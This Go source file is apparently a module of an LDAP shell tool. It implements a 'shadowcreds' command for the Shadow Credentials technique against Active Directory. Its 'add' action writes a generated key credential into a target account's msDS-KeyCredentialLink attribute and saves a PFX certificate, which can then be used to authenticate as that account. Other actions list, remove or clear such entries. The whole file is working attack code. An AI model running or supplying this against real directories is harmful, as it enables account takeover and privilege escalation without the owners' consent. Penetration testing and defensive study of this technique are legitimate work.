package main

import (
	"crypto/rand"
	"os"
	"strings"
	"time"

	ldap "github.com/jfjallid/ldap/v3"
)

const (
	ShellShadowCreds = "shadowcreds"
)

var shadowUsageKeys = []string{
	ShellShadowCreds,
}

func init() {
	usageMap[ShellShadowCreds] = ShellShadowCreds + " -action add|list|remove|clear -target <sam> [-device-id id] [-out file] [-pfx-pass pw] [-no-pfx-pass]"
	descriptionMap[ShellShadowCreds] = "Manage msDS-KeyCredentialLink (Shadow Credentials)"

	handlers[ShellShadowCreds] = shellShadowCredsCmd

	allKeys = append(allKeys, shadowUsageKeys...)

	helpFunctions[5] = func(self *shell) {
		self.showCustomHelpFunc(80, "Shadow Credentials", shadowUsageKeys)
	}
}

func shellShadowCredsCmd(self *shell, argArr any) {
	if self.conn == nil || !self.authenticated {
		self.println("Not connected. Use 'connect' and 'login' first.")
		return
	}

	args := argArr.([]string)
	fs, buf := self.newFlagSet("shadowcreds")
	action := fs.String("action", "", "Action: add, list, remove, clear (required)")
	target := fs.String("target", "", "sAMAccountName of target account (required)")
	deviceID := fs.String("device-id", "", "Device ID to remove (for 'remove' action)")
	outFile := fs.String("out", "", "Output PFX file path (default: <target>.pfx)")
	pfxPass := fs.String("pfx-pass", "", "PFX file password (random if omitted)")
	noPfxPass := fs.Bool("no-pfx-pass", false, "Use an empty PFX password instead of generating one")

	if err := fs.Parse(args); err != nil {
		if buf.Len() > 0 {
			self.printf("%s\n", buf.String())
		}
		return
	}

	if *action == "" || *target == "" {
		self.println("Error: -action and -target are required")
		self.println("Usage: " + usageMap[ShellShadowCreds])
		return
	}

	conn := self.conn
	baseDN := self.baseDN

	switch *action {
	case "add":
		pass, generated, err := resolvePfxPass(*pfxPass, *noPfxPass)
		if err != nil {
			self.printf("%v\n", err)
			return
		}

		dn, _, err := lookupTarget(conn, baseDN, *target)
		if err != nil {
			self.printf("Target lookup failed: %v\n", err)
			return
		}

		key, cert, blob, devID, err := generateShadowCredential(*target)
		if err != nil {
			self.printf("Credential generation failed: %v\n", err)
			return
		}

		dnBinValue := toDNWithBinary(blob, dn)
		modReq := ldap.NewModifyRequest(dn, nil)
		modReq.Add("msDS-KeyCredentialLink", []string{dnBinValue})
		if err := conn.Modify(modReq); err != nil {
			self.printf("LDAP modify failed: %v\n", err)
			return
		}

		pfxData, err := exportPFX(rand.Reader, key, cert, pass)
		if err != nil {
			self.printf("PFX export failed: %v\n", err)
			return
		}

		out := *outFile
		if out == "" {
			out = *target + ".pfx"
		}
		if err := os.WriteFile(out, pfxData, 0600); err != nil {
			self.printf("Failed to write PFX file: %v\n", err)
			return
		}

		self.printf("Shadow credential added to %s\n", dn)
		self.printf("  Device ID:  %s\n", devID.String())
		self.printf("  PFX file:   %s\n", out)
		printPfxPass(self.printf, pass, generated)

	case "list":
		dn, existing, err := lookupTarget(conn, baseDN, *target)
		if err != nil {
			self.printf("Target lookup failed: %v\n", err)
			return
		}

		self.printf("Key credentials for %s:\n", dn)
		if len(existing) == 0 {
			self.println("  (none)")
			return
		}

		for i, val := range existing {
			blob, _, parseErr := parseDNWithBinary(val)
			if parseErr != nil {
				self.printf("  [%d] (parse error: %v)\n", i, parseErr)
				continue
			}
			parsed, parseErr := parseKeyCredentialBlob(blob)
			if parseErr != nil {
				self.printf("  [%d] (blob parse error: %v)\n", i, parseErr)
				continue
			}
			self.printf("  [%d] DeviceID: %s  Created: %s\n", i, parsed.DeviceID, parsed.CreationTime.UTC().Format(time.RFC3339))
		}

	case "remove":
		if *deviceID == "" {
			self.println("Error: -device-id is required for 'remove' action")
			return
		}

		dn, existing, err := lookupTarget(conn, baseDN, *target)
		if err != nil {
			self.printf("Target lookup failed: %v\n", err)
			return
		}

		removeID := strings.ToLower(*deviceID)
		var kept []string
		found := false

		for _, val := range existing {
			blob, _, parseErr := parseDNWithBinary(val)
			if parseErr != nil {
				kept = append(kept, val)
				continue
			}
			parsed, parseErr := parseKeyCredentialBlob(blob)
			if parseErr != nil {
				kept = append(kept, val)
				continue
			}
			if strings.ToLower(parsed.DeviceID) == removeID {
				found = true
				continue
			}
			kept = append(kept, val)
		}

		if !found {
			self.printf("Device ID %s not found in key credentials for %s\n", *deviceID, *target)
			return
		}

		modReq := ldap.NewModifyRequest(dn, nil)
		if len(kept) == 0 {
			modReq.Delete("msDS-KeyCredentialLink", []string{})
		} else {
			modReq.Replace("msDS-KeyCredentialLink", kept)
		}
		if err := conn.Modify(modReq); err != nil {
			self.printf("LDAP modify failed: %v\n", err)
			return
		}
		self.printf("Removed key credential with Device ID %s from %s\n", *deviceID, dn)

	case "clear":
		dn, existing, err := lookupTarget(conn, baseDN, *target)
		if err != nil {
			self.printf("Target lookup failed: %v\n", err)
			return
		}

		if len(existing) == 0 {
			self.printf("No key credentials to clear on %s\n", dn)
			return
		}

		modReq := ldap.NewModifyRequest(dn, nil)
		modReq.Delete("msDS-KeyCredentialLink", []string{})
		if err := conn.Modify(modReq); err != nil {
			self.printf("LDAP modify failed: %v\n", err)
			return
		}
		self.printf("Cleared %d key credential(s) from %s\n", len(existing), dn)

	default:
		self.printf("Unknown action: %s (valid: add, list, remove, clear)\n", *action)
	}
}
